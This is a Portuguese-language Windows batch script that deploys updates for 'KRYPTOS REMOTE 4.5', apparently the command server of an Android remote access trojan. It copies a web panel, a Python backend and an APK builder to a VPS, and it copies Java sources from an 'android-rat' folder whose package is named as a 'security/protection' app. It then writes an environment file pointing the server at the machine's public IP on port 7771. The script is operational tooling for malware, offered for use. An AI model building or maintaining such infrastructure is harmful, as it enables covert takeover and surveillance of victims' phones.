@echo off
chcp 65001 >nul
setlocal enabledelayedexpansion
title KRYPTOS REMOTE 4.5 - Atualizar VPS

echo =======================================================================
echo        ATUALIZANDO VPS - KRYPTOS REMOTE 4.5
echo =======================================================================
echo.

set "LOCAL_DIR=%~dp0server"
set "LOCAL_ANDROID=%~dp0android-rat"

if not exist "%LOCAL_DIR%\main.py" (
    echo [ERRO] Nao encontrei "%LOCAL_DIR%\main.py"
    pause & exit /b 1
)

set "DEST_DIR="
for %%P in (
    "C:\kryptos\server"
    "C:\KRYPTOS\server"
    "C:\gangstar\server"
    "C:\finalvnc\finalvnc\server"
    "C:\Users\Administrador\Desktop\kryptos\server"
    "C:\Users\Administrator\Desktop\kryptos\server"
    "D:\kryptos\server"
) do (
    if exist "%%~P\main.py" if "!DEST_DIR!"=="" set "DEST_DIR=%%~P"
)

if "!DEST_DIR!"=="" (
    echo Cole abaixo o caminho COMPLETO da pasta "server" na VPS.
    set /p "DEST_DIR=Caminho: "
)
if not exist "!DEST_DIR!\main.py" ( echo [ERRO] Pasta invalida. & pause & exit /b 1 )
echo [OK] Destino: !DEST_DIR!
echo.

set "PUB="
for /f "delims=" %%i in ('curl -s --max-time 6 https://api.ipify.org') do set "PUB=%%i"
if "!PUB!"=="" set "PUB=127.0.0.1"

echo [1/4] Copiando frontend compilado...
xcopy /E /I /Y "%LOCAL_DIR%\web-dist" "!DEST_DIR!\web-dist" >nul

echo [2/4] Copiando backend...
copy /Y "%LOCAL_DIR%\main.py" "!DEST_DIR!\main.py" >nul
copy /Y "%LOCAL_DIR%\apk_builder.py" "!DEST_DIR!\apk_builder.py" >nul

echo [3/4] Copiando Java Android...
for %%A in ("!DEST_DIR!\..\..") do set "DEST_PROJECT=%%~fA"
set "JAVA_SRC=%LOCAL_ANDROID%\app\src\main\java\com\seguranca\protecao"
set "JAVA_DST=!DEST_PROJECT!\android-rat\app\src\main\java\com\seguranca\protecao"
if exist "%JAVA_SRC%" (
    if not exist "!JAVA_DST!" mkdir "!JAVA_DST!"
    copy /Y "%JAVA_SRC%\*.java" "!JAVA_DST!\" >nul
) else ( echo [AVISO] Sem fontes Java. )

echo [4/4] Escrevendo .env (IP: !PUB!)...
(
  echo SERVER_URL=http://!PUB!:7771
  echo SERVER_WS_URL=ws://!PUB!:7771/ws
  echo KRYPTOS_HOST=0.0.0.0
  echo KRYPTOS_PORT=7771
  echo DATABASE_URL=sqlite:///gangstar_local.db
) > "!DEST_DIR!\.env"

echo.
echo TUDO ATUALIZADO. Na VPS: feche o servidor e abra INSTALAR_Y_ARRANCAR.bat de novo.
pause
